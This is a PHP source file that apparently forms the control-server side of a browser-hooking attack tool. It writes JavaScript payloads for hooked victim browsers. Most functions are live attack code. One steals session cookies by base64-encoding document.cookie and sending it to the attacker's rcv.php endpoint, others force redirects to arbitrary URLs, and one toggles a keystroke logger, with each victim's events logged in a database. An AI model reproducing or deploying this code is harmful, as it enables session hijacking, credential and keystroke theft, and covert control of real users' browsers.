<?php
    require_once('database.php');
    connectToDatabase();
?>

<?php
   /*   Add command execution event in bdd "event_browsers"
    *   $browserID = the id browser generated in hook.js
    *   $command = the command that will be execute by victim browser 
    */
    function addCommandExecutionEvent($browserId, $command) {
        if(isset($browserId) && !empty($browserId)) {
            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("INSERT INTO event_browsers (date, browser_id, event_type, event) VALUES (NOW(3), ?, 'command execution', ?)"))) {
                return;
            }    
            if(!$stmt->bind_param("ss", $browserId, $command)) {
                return;
            }    
            if(!$stmt->execute()) {
                return;
            }
        }
    }

   /*   Add "steal cookies" payload in command.js file
    *   $browserID = the id browser generated in hook.js
    */
    function stealUserCookies($browserId) { 
        if(isset($browserId) && !empty($browserId)) {
            $file = '../../payloads/' . $browserId . '_commands.js';
            $command = 'new Image().src = "http://" + address + "/rcv.php?browserId=" + browserID + "&eventType=command result&event=" + btoa(document.cookie);';

            file_put_contents($file, $command);
            addCommandExecutionEvent($browserId, "Steal user cookies");
            return 0;
        }      

        return 1;
    }

   /*   Add "diaply dialog box" payload in command.js file
    *   $browserID = the id browser generated in hook.js
    */
    function displayDialogBox($browserId, $message) {
        if(isset($browserId) && !empty($browserId)) {
            $file = '../../payloads/' . $browserId . '_commands.js';
            $command = 'new Image().src = "http://" + address + "/rcv.php?browserId=" + browserID + "&eventType=command result&event=" + btoa("display of the dialog box successfully");alert("' . $message . '");';

            file_put_contents($file, $command);
            addCommandExecutionEvent($browserId, "Display dialog box(\"" . $message . "\")");
            return 0;
        }  

        return 1;
    }

   /*   Add "redirect" payload in command.js file
    *   $browserID = the id browser generated in hook.js
    */
    function redirect($browserId, $url) {
        if(isset($browserId) && !empty($browserId)) {
            $file = '../../payloads/' . $browserId . '_commands.js';
            
            $command = 'new Image().src = "http://" + address + "/rcv.php?browserId=" + browserID + "&eventType=command result&event=" + btoa("redirect successfully");window.location.replace("' . $url . '");';

            file_put_contents($file, $command);
            addCommandExecutionEvent($browserId, "Redirect user(\"" . $url . "\")");
            return 0;
        }  

        return 1;
    }

    function keylogger($browserId, $state) {
        if(isset($browserId) && !empty($browserId)) {
            $file = '../../payloads/' . $browserId . '_commands.js';
            if($state === "enable") {
                $command = 'new Image().src = "http://" + address + "/rcv.php?browserId=" + browserID + "&eventType=command result&event=" + btoa("keylogger enabled successfully");document.onkeypress = getOnKeyPress;document.onkeydown = getOnKeyDown;';
            }
            else {
                $command = 'new Image().src = "http://" + address + "/rcv.php?browserId=" + browserID + "&eventType=command result&event=" + btoa("keylogger disabled successfully");document.onkeypress = "";document.onkeydown = "";';              
            }

            file_put_contents($file, $command);

            return 0;
        }  

        return 1;
    }

    function getKeyloggerState($browserId) {
        if(isset($browserId) && !empty($browserId)) {
            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("SELECT browser_id, keylogger_func FROM keylogger_browsers WHERE browser_id = ?"))) {
                return;
            }

            if (!$stmt->bind_param("s", $browserId)) {
                return;
            }
            
            if(!$stmt->execute()) {
                return;
            }

            $outBrowserId = NULL;
            $outKeyloggerState = NULL;
            $keyloggerState = array();

            $stmt->store_result();
            $stmt->bind_result($outBrowserId, $outKeyloggerState);
            if($stmt->num_rows === 1) { 
                while ($stmt->fetch()) {
                    $keyloggerState[] = array('browserId'=>$outBrowserId, 'state'=>$outKeyloggerState);
                }

                $stmt->free_result();
                $stmt->close(); 

                return $keyloggerState;  
            }
        }  
    }
?>